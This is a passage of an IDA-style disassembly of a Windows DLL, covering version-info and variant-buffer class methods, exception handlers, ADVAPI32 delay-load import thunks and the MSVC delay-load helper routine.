		call	sub_6AF3102E
		pop	ecx

loc_6AF51B58:				; CODE XREF: Ordinal1497+23j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1497	endp

; Exported entry 1500.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1500
Ordinal1500	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		cmp	[esp+4+arg_0], esi
		jz	short loc_6AF51B7F
		push	[esp+4+arg_0]
		call	Ordinal1506
		test	eax, eax
		jnz	short loc_6AF51B7F
		push	offset aCvariantbuf_19 ; "CVariantBuffer::operator =() : Copy()	="...
		call	sub_6AF3102E
		pop	ecx

loc_6AF51B7F:				; CODE XREF: Ordinal1500+7j
					; Ordinal1500+14j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1500	endp

; Exported entry 1539.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1539
Ordinal1539	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	0Ch
		pop	eax
		retn
Ordinal1539	endp

; Exported entry 1540.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1540
Ordinal1540	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		cmp	eax, 0Ch
		jnb	short loc_6AF51B9F
		test	eax, eax
		jl	short loc_6AF51B9F
		lea	eax, [eax+eax*2+0Fh]
		mov	eax, [ecx+eax*4]
		jmp	short locret_6AF51BAC
; ---------------------------------------------------------------------------

loc_6AF51B9F:				; CODE XREF: Ordinal1540+7j
					; Ordinal1540+Bj
		push	offset aCversioninfoGe ; "CVersionInfo::GetFieldName() : nIndex	>"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

locret_6AF51BAC:			; CODE XREF: Ordinal1540+14j
		retn	4
Ordinal1540	endp

; Exported entry 1528.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1528
Ordinal1528	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+4Ch]
		retn
Ordinal1528	endp

; Exported entry 1529.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1529
Ordinal1529	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+58h]
		retn
Ordinal1529	endp

; Exported entry 1530.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1530
Ordinal1530	proc near		; CODE XREF: Ordinal562+104p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+64h]
		retn
Ordinal1530	endp

; Exported entry 1531.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1531
Ordinal1531	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+70h]
		retn
Ordinal1531	endp

; Exported entry 1532.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1532
Ordinal1532	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+7Ch]
		retn
Ordinal1532	endp

; Exported entry 1533.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1533
Ordinal1533	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+88h]
		retn
Ordinal1533	endp

; Exported entry 1534.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1534
Ordinal1534	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+94h]
		retn
Ordinal1534	endp

; Exported entry 1535.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1535
Ordinal1535	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+0A0h]
		retn
Ordinal1535	endp

; Exported entry 1536.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1536
Ordinal1536	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+0ACh]
		retn
Ordinal1536	endp

; Exported entry 1537.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1537
Ordinal1537	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+0B8h]
		retn
Ordinal1537	endp

; Exported entry 1538.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1538
Ordinal1538	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+0C4h]
		retn
Ordinal1538	endp

; Exported entry 1541.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1541
Ordinal1541	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		cmp	eax, 0Ch
		jnb	short loc_6AF51C03
		test	eax, eax
		jl	short loc_6AF51C03
		lea	eax, [eax+eax*2]
		mov	eax, [ecx+eax*4+40h]
		jmp	short locret_6AF51C10
; ---------------------------------------------------------------------------

loc_6AF51C03:				; CODE XREF: Ordinal1541+7j
					; Ordinal1541+Bj
		push	offset aCversioninfo_0 ; "CVersionInfo::GetFieldValue()	: nIndex "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

locret_6AF51C10:			; CODE XREF: Ordinal1541+14j
		retn	4
Ordinal1541	endp

; Exported entry 1522.

; =============== S U B	R O U T	I N E =======================================


; void __thiscall Ordinal1522(void *)
		public Ordinal1522
Ordinal1522	proc near		; CODE XREF: sub_6AF51C53+3p
					; DATA XREF: Ordinal1524o ...
		mov	dword ptr [ecx], offset	off_6AF617B0
		add	ecx, 8
		jmp	sub_6AF3789B
Ordinal1522	endp

; Exported entry 1524.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1524
Ordinal1524	proc near		; CODE XREF: Ordinal562+11Bp
					; sub_6AF51CA3+3p ...
		push	offset Ordinal1522 ; void (__thiscall *)(void *)
		push	0Ch		; int
		mov	dword ptr [ecx], offset	off_6AF617B4
		push	0Ch		; unsigned int
		add	ecx, 38h
		push	ecx		; void *
		call	unknown_libname_17 ; Microsoft VisualC 2-10/net	runtime
		retn
Ordinal1524	endp

; Exported entry 1521.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1521
Ordinal1521	proc near		; DATA XREF: Ordinal1523+6o
					; .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		lea	ecx, [esi+8]
		mov	dword ptr [esi], offset	off_6AF617B0
		call	sub_6AF318C3
		mov	eax, esi
		pop	esi
		retn
Ordinal1521	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF51C53(void *, char)
sub_6AF51C53	proc near		; DATA XREF: .rdata:off_6AF617B0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1522
		test	[esp+4+arg_0], 1
		jz	short loc_6AF51C69
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF51C69:				; CODE XREF: sub_6AF51C53+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF51C53	endp

; Exported entry 1523.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1523
Ordinal1523	proc near		; CODE XREF: Ordinal562+CDp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		push	offset Ordinal1522 ; void (__thiscall *)(void *)
		push	offset Ordinal1521 ; int
		mov	esi, ecx
		push	0Ch		; int
		push	0Ch		; unsigned int
		lea	eax, [esi+38h]
		push	eax		; void *
		mov	dword ptr [esi], offset	off_6AF617B4
		call	unknown_libname_18 ; Microsoft VisualC 2-10/net	runtime
		push	34h		; Size
		lea	eax, [esi+4]
		push	0		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn
Ordinal1523	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF51CA3(void *, char)
sub_6AF51CA3	proc near		; DATA XREF: .rdata:off_6AF617B4o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1524
		test	[esp+4+arg_0], 1
		jz	short loc_6AF51CB9
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF51CB9:				; CODE XREF: sub_6AF51CA3+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF51CA3	endp

; Exported entry 1542.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1542(__int16, __int16, int, LPCVOID pBlock, int)
		public Ordinal1542
Ordinal1542	proc near		; CODE XREF: Ordinal1525+15Cp
					; DATA XREF: .rdata:off_6AF66098o

var_50		= byte ptr -50h
puLen		= dword	ptr -30h
lpSubBlock	= dword	ptr -2Ch
Src		= dword	ptr -28h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= word ptr  8
arg_4		= word ptr  0Ch
arg_8		= dword	ptr  10h
pBlock		= dword	ptr  14h
arg_10		= dword	ptr  18h

		mov	eax, offset unknown_libname_123	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 4Ch
		mov	eax, ___security_cookie
		mov	ecx, [ebp+arg_10]
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		call	sub_6AF317A8
		push	offset aCversioninfoLo ; "CVersionInfo::LoadBlock()"
		lea	ecx, [ebp+var_50]
		call	Ordinal751
		xor	esi, esi
		lea	ecx, [ebp+lpSubBlock]
		mov	[ebp+var_4], esi
		call	sub_6AF318C3
		push	[ebp+arg_8]
		movzx	eax, [ebp+arg_4]
		push	eax
		movzx	eax, [ebp+arg_0]
		push	eax		; Args
		lea	eax, [ebp+lpSubBlock]
		push	offset aStringfileinfo ; "\\StringFileInfo\\%04x%04x\\%s"
		push	eax		; int
		mov	byte ptr [ebp+var_4], 2
		mov	[ebp+Src], esi
		mov	[ebp+puLen], esi
		call	sub_6AF3217C
		mov	edi, [ebp+lpSubBlock]
		add	esp, 14h
		lea	eax, [ebp+puLen]
		push	eax		; puLen
		lea	eax, [ebp+Src]
		push	eax		; lplpBuffer
		push	edi		; lpSubBlock
		push	[ebp+pBlock]	; pBlock
		call	VerQueryValueA
		test	eax, eax
		jz	short loc_6AF51D86
		cmp	[ebp+puLen], esi
		jz	short loc_6AF51D86
		push	[ebp+Src]	; Src
		mov	ecx, [ebp+arg_10]
		call	sub_6AF31B1D
		lea	ecx, [edi-10h]
		call	sub_6AF3160D

loc_6AF51D54:				; DATA XREF: sub_6AF51D9B+3Do
					; sub_6AF51DDE+4Fo
		lea	ecx, [ebp+var_50]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		inc	esi

loc_6AF51D63:				; CODE XREF: Ordinal1542+DAj
		lea	ecx, [ebp+var_50]
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	14h
; ---------------------------------------------------------------------------

loc_6AF51D86:				; CODE XREF: Ordinal1542+7Bj
					; Ordinal1542+80j
		push	offset aCversioninfo_1 ; "CVersionInfo::LoadBlock() : VerQueryVal"...
		call	sub_6AF31006
		pop	ecx
		lea	ecx, [edi-10h]
		call	sub_6AF3160D
		jmp	short loc_6AF51D63
Ordinal1542	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF51D9B	proc near		; DATA XREF: .rdata:6AF64560o
		push	13h
		lea	ecx, [ebp-50h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-50h]
		call	Ordinal762
		mov	ecx, [ebp-54h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-50h]
		call	Ordinal764
		lea	ecx, [ebp-50h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF51D54
		retn
sub_6AF51D9B	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF51DDE	proc near		; DATA XREF: .rdata:6AF64570o
		push	15h
		lea	ecx, [ebp-50h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-50h]
		call	Ordinal762
		mov	eax, [ebp-58h]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-50h]
		call	Ordinal764
		lea	ecx, [ebp-50h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF51D54
		retn
sub_6AF51DDE	endp

; Exported entry 1525.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1525(unsigned int Filename)
		public Ordinal1525
Ordinal1525	proc near		; CODE XREF: Ordinal562+E8p
					; DATA XREF: .rdata:off_6AF66098o

var_68		= byte ptr -68h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
pBlock		= dword	ptr -0Ch
lpBuffer	= dword	ptr -8
dwHandle	= dword	ptr -4
Filename	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 68h
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		push	34h		; Size
		xor	edi, edi
		lea	eax, [ebx+4]
		push	edi		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		lea	esi, [ebx+40h]

loc_6AF51E52:				; CODE XREF: Ordinal1525+38j
		mov	eax, ds:off_6AF6162C[edi]
		mov	ecx, esi
		mov	[esi-4], eax
		call	sub_6AF317A8
		add	edi, 4
		add	esi, 0Ch
		cmp	edi, 30h
		jb	short loc_6AF51E52
		lea	ecx, [ebp+var_68]
		call	Ordinal1163
		push	[ebp+Filename]	; Filename
		lea	ecx, [ebp+var_68]
		call	Ordinal1165
		test	eax, eax
		jnz	short loc_6AF51E96
		push	offset aCversioninfo_2 ; "CVersionInfo::Load() : path.SplitPath()"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	loc_6AF51FD8
; ---------------------------------------------------------------------------

loc_6AF51E96:				; CODE XREF: Ordinal1525+4Fj
		lea	eax, [ebp+dwHandle]
		xor	esi, esi
		push	eax		; lpdwHandle
		lea	ecx, [ebp+var_68]
		mov	[ebp+dwHandle],	esi
		call	Ordinal1118
		push	eax		; lptstrFilename
		call	GetFileVersionInfoSizeA
		mov	edi, eax
		cmp	edi, esi
		jnz	short loc_6AF51EC3
		push	offset aCversioninfo_3 ; "CVersionInfo::Load() : GetFileVersionIn"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF51FD8
; ---------------------------------------------------------------------------

loc_6AF51EC3:				; CODE XREF: Ordinal1525+7Ej
		lea	ecx, [ebp+var_24]
		call	Ordinal861
		push	edi		; Args
		lea	ecx, [ebp+var_24]
		call	Ordinal870
		mov	esi, eax
		test	esi, esi
		mov	[ebp+pBlock], esi
		jnz	short loc_6AF51EED
		push	offset aCversioninfo_4 ; "CVersionInfo::Load() : mem.NewAlloc()	="...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF51FD0
; ---------------------------------------------------------------------------

loc_6AF51EED:				; CODE XREF: Ordinal1525+A8j
		and	[ebp+var_10], 0
		push	esi		; lpData
		push	edi		; dwLen
		push	[ebp+dwHandle]	; dwHandle
		lea	ecx, [ebp+var_68]
		call	Ordinal1118
		push	eax		; lptstrFilename
		call	GetFileVersionInfoA
		test	eax, eax
		jnz	short loc_6AF51F12
		push	offset aCversioninfo_5 ; "CVersionInfo::Load() : GetFileVersionIn"...
		jmp	loc_6AF51FC7
; ---------------------------------------------------------------------------

loc_6AF51F12:				; CODE XREF: Ordinal1525+D3j
		and	[ebp+Filename],	0
		and	[ebp+lpBuffer],	0
		lea	eax, [ebp+Filename]
		push	eax		; puLen
		lea	eax, [ebp+lpBuffer]
		push	eax		; lplpBuffer
		push	offset SubBlock	; "\\"
		push	esi		; pBlock
		call	VerQueryValueA
		test	eax, eax
		jz	loc_6AF51FC2
		cmp	[ebp+Filename],	34h
		jnz	loc_6AF51FC2
		mov	esi, [ebp+lpBuffer]
		push	0Dh
		pop	ecx
		lea	eax, [ebp+Filename]
		push	eax		; puLen
		lea	eax, [ebp+var_14]
		push	eax		; lplpBuffer
		push	offset aVarfileinfoTra ; "\\VarFileInfo\\Translation"
		push	[ebp+pBlock]	; pBlock
		lea	edi, [ebx+4]
		rep movsd
		and	[ebp+Filename],	0
		call	VerQueryValueA
		test	eax, eax
		jz	short loc_6AF51FC2
		test	[ebp+Filename],	0FFFFFFFCh
		jbe	short loc_6AF51FAE
		push	0Ch
		lea	esi, [ebx+3Ch]
		pop	edi

loc_6AF51F76:				; CODE XREF: Ordinal1525+177j
		lea	eax, [esi+4]
		push	eax		; int
		mov	eax, [ebp+var_14]
		push	[ebp+pBlock]	; pBlock
		xor	ecx, ecx
		mov	cx, [eax+2]
		push	dword ptr [esi]	; int
		movzx	eax, word ptr [eax]
		push	ecx		; __int16
		push	eax		; __int16
		mov	ecx, ebx
		call	Ordinal1542
		test	eax, eax
		jnz	short loc_6AF51FA6
		push	dword ptr [esi]	; Args
		push	offset aCversioninfo_6 ; "CVersionInfo::Load() : LoadBlock(%s) =="...
		call	sub_6AF31006
		pop	ecx
		pop	ecx

loc_6AF51FA6:				; CODE XREF: Ordinal1525+163j
		add	esi, 0Ch
		dec	edi
		jnz	short loc_6AF51F76
		jmp	short loc_6AF51FB9
; ---------------------------------------------------------------------------

loc_6AF51FAE:				; CODE XREF: Ordinal1525+13Bj
		push	offset aCversioninfo_7 ; "CVersionInfo::Load() : (nSize	/ sizeof("...
		call	sub_6AF31006
		pop	ecx

loc_6AF51FB9:				; CODE XREF: Ordinal1525+179j
		mov	[ebp+var_10], 1
		jmp	short loc_6AF51FCD
; ---------------------------------------------------------------------------

loc_6AF51FC2:				; CODE XREF: Ordinal1525+FCj
					; Ordinal1525+106j ...
		push	offset aCversioninfo_8 ; "CVersionInfo::Load() : VerQueryValue() "...

loc_6AF51FC7:				; CODE XREF: Ordinal1525+DAj
		call	sub_6AF3102E
		pop	ecx

loc_6AF51FCD:				; CODE XREF: Ordinal1525+18Dj
		mov	esi, [ebp+var_10]

loc_6AF51FD0:				; CODE XREF: Ordinal1525+B5j
		lea	ecx, [ebp+var_24]
		call	Ordinal863

loc_6AF51FD8:				; CODE XREF: Ordinal1525+5Ej
					; Ordinal1525+8Bj
		lea	ecx, [ebp+var_68]
		call	Ordinal1164
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal1525	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		mov	eax, offset FreeSid
		jmp	$+5

loc_6AF51FF3:				; CODE XREF: .text:6AF52009j
					; .text:6AF52013j ...
		push	ecx
		push	edx
		push	eax
		push	offset ADVAPI32_dll_import_table
		call	sub_6AF5215E
		pop	edx
		pop	ecx
		jmp	eax
; ---------------------------------------------------------------------------
		mov	eax, offset SetSecurityDescriptorDacl
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset AddAccessAllowedAce
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset InitializeAcl
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset InitializeSecurityDescriptor
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset GetLengthSid
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset AllocateAndInitializeSid
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset DeregisterEventSource
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset ReportEventA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset LookupAccountNameA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset GetUserNameA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegisterEventSourceA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset EqualSid
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset GetTokenInformation
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset OpenProcessToken
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset OpenThreadToken
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset __imp_CheckTokenMembership
		jmp	loc_6AF51FF3
; [00000006 BYTES: COLLAPSED FUNCTION CheckTokenMembership. PRESS KEYPAD "+" TO	EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, offset RegCloseKey
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegDeleteValueA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegQueryValueExA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegSetValueExA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegEnumValueA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegEnumKeyExA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegCreateKeyExA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegOpenKeyExA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset CloseServiceHandle
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset ChangeServiceConfig2A
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset CreateServiceA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset OpenSCManagerA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset DeleteService
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset OpenServiceA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset SetServiceStatus
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegisterServiceCtrlHandlerA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset RegisterServiceCtrlHandlerExA
		jmp	loc_6AF51FF3
; ---------------------------------------------------------------------------
		mov	eax, offset StartServiceCtrlDispatcherA
		jmp	loc_6AF51FF3

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF5215E(int, ULONG_PTR Arguments)
sub_6AF5215E	proc near		; CODE XREF: .text:6AF51FFBp

var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
lpLibFileName	= dword	ptr -38h
var_34		= dword	ptr -34h
lpProcName	= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
Target		= dword	ptr -18h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Arguments	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		push	ebx
		mov	eax, offset __ImageBase
		push	esi
		mov	esi, [ebp+arg_0]
		mov	edx, [esi+8]
		mov	ecx, [esi+4]
		mov	ebx, [esi+0Ch]
		add	edx, eax
		push	edi
		mov	edi, [esi+14h]
		add	edi, eax
		add	ecx, eax
		mov	[ebp+Target], edx
		mov	edx, [esi+10h]
		add	ebx, eax
		add	edx, eax
		mov	eax, [esi+1Ch]
		mov	[ebp+var_4], eax
		mov	eax, [ebp+Arguments]
		mov	[ebp+lpLibFileName], ecx
		xor	ecx, ecx
		mov	[ebp+var_C], edi
		mov	[ebp+var_3C], eax
		xor	eax, eax
		test	dword ptr [esi], 1
		lea	edi, [ebp+lpProcName]
		mov	[ebp+var_44], 24h
		mov	[ebp+var_40], esi
		mov	[ebp+var_34], ecx
		stosd
		mov	[ebp+var_2C], ecx
		mov	[ebp+var_28], ecx
		mov	[ebp+var_24], ecx
		jnz	short loc_6AF521E2
		lea	eax, [ebp+var_44]
		mov	[ebp+Arguments], eax
		lea	eax, [ebp+Arguments]
		push	eax		; lpArguments
		push	1		; nNumberOfArguments
		push	ecx		; dwExceptionFlags
		push	0C06D0057h	; dwExceptionCode
		call	ds:RaiseException
		xor	eax, eax
		jmp	loc_6AF5239A
; ---------------------------------------------------------------------------

loc_6AF521E2:				; CODE XREF: sub_6AF5215E+63j
		mov	eax, [ebp+Target]
		mov	edi, [eax]
		mov	eax, [ebp+Arguments]
		sub	eax, ebx
		sar	eax, 2
		shl	eax, 2
		add	edx, eax
		mov	edx, [edx]
		mov	[ebp+arg_0], eax
		mov	eax, edx
		shr	eax, 1Fh
		not	eax
		and	eax, 1
		mov	[ebp+var_34], eax
		jz	short loc_6AF52213
		lea	eax, word_6AF30002[edx]
		mov	[ebp+lpProcName], eax
		jmp	short loc_6AF5221C
; ---------------------------------------------------------------------------

loc_6AF52213:				; CODE XREF: sub_6AF5215E+A8j
		and	edx, 0FFFFh
		mov	[ebp+lpProcName], edx

loc_6AF5221C:				; CODE XREF: sub_6AF5215E+B3j
		mov	eax, dword_6AF68280
		xor	ebx, ebx
		cmp	eax, ecx
		jz	short loc_6AF52238
		lea	edx, [ebp+var_44]
		push	edx
		push	ecx
		call	eax ; dword_6AF68280
		mov	ebx, eax
		test	ebx, ebx
		jnz	loc_6AF5237D

loc_6AF52238:				; CODE XREF: sub_6AF5215E+C7j
		test	edi, edi
		jnz	loc_6AF522E2
		mov	eax, dword_6AF68280
		test	eax, eax
		jz	short loc_6AF52257
		lea	ecx, [ebp+var_44]
		push	ecx
		push	1
		call	eax ; dword_6AF68280
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF522A7

loc_6AF52257:				; CODE XREF: sub_6AF5215E+E9j
		push	[ebp+lpLibFileName] ; lpLibFileName
		call	ds:LoadLibraryA
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF522A7
		call	ds:GetLastError
		mov	[ebp+var_24], eax
		mov	eax, dword_6AF6827C
		test	eax, eax
		jz	short loc_6AF52286
		lea	ecx, [ebp+var_44]
		push	ecx
		push	3
		call	eax ; dword_6AF6827C
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF522A7

loc_6AF52286:				; CODE XREF: sub_6AF5215E+118j
		lea	eax, [ebp+var_44]
		mov	[ebp+Arguments], eax
		lea	eax, [ebp+Arguments]
		push	eax		; lpArguments
		push	1		; nNumberOfArguments
		push	0		; dwExceptionFlags
		push	0C06D007Eh	; dwExceptionCode
		call	ds:RaiseException
		mov	eax, [ebp+var_28]
		jmp	loc_6AF5239A
; ---------------------------------------------------------------------------

loc_6AF522A7:				; CODE XREF: sub_6AF5215E+F7j
					; sub_6AF5215E+106j ...
		push	edi		; Value
		push	[ebp+Target]	; Target
		call	ds:InterlockedExchange
		cmp	eax, edi
		jz	short loc_6AF522DB
		cmp	dword ptr [esi+18h], 0
		jz	short loc_6AF522E2
		push	8		; uBytes
		push	40h		; uFlags
		call	ds:LocalAlloc
		test	eax, eax
		jz	short loc_6AF522E2
		mov	[eax+4], esi
		mov	ecx, dword_6AF68278
		mov	[eax], ecx
		mov	dword_6AF68278,	eax
		jmp	short loc_6AF522E2
; ---------------------------------------------------------------------------

loc_6AF522DB:				; CODE XREF: sub_6AF5215E+155j
		push	edi		; hLibModule
		call	ds:FreeLibrary

loc_6AF522E2:				; CODE XREF: sub_6AF5215E+DCj
					; sub_6AF5215E+15Bj ...
		mov	eax, dword_6AF68280
		test	eax, eax
		mov	[ebp+var_2C], edi
		jz	short loc_6AF522F8
		lea	ecx, [ebp+var_44]
		push	ecx
		push	2
		call	eax ; dword_6AF68280
		mov	ebx, eax

loc_6AF522F8:				; CODE XREF: sub_6AF5215E+18Ej
		test	ebx, ebx
		jnz	short loc_6AF52378
		cmp	[esi+14h], ebx
		jz	short loc_6AF5232D
		cmp	[esi+1Ch], ebx
		jz	short loc_6AF5232D
		mov	eax, [edi+3Ch]
		add	eax, edi
		cmp	dword ptr [eax], 4550h
		jnz	short loc_6AF5232D
		mov	ecx, [ebp+var_4]
		cmp	[eax+8], ecx
		jnz	short loc_6AF5232D
		cmp	edi, [eax+34h]
		jnz	short loc_6AF5232D
		mov	eax, [ebp+var_C]
		mov	ecx, [ebp+arg_0]
		mov	ebx, [ecx+eax]
		test	ebx, ebx
		jnz	short loc_6AF52378

loc_6AF5232D:				; CODE XREF: sub_6AF5215E+1A1j
					; sub_6AF5215E+1A6j ...
		push	[ebp+lpProcName] ; lpProcName
		push	edi		; hModule
		call	ds:GetProcAddress
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_6AF52378
		call	ds:GetLastError
		mov	[ebp+var_24], eax
		mov	eax, dword_6AF6827C
		test	eax, eax
		jz	short loc_6AF52359
		lea	ecx, [ebp+var_44]
		push	ecx
		push	4
		call	eax ; dword_6AF6827C
		mov	ebx, eax

loc_6AF52359:				; CODE XREF: sub_6AF5215E+1EFj
		test	ebx, ebx
		jnz	short loc_6AF52378
		lea	eax, [ebp+var_44]
		mov	[ebp+arg_0], eax
		lea	eax, [ebp+arg_0]
		push	eax		; lpArguments
		push	1		; nNumberOfArguments
		push	ebx		; dwExceptionFlags
		push	0C06D007Fh	; dwExceptionCode
		call	ds:RaiseException
		mov	ebx, [ebp+var_28]

loc_6AF52378:				; CODE XREF: sub_6AF5215E+19Cj
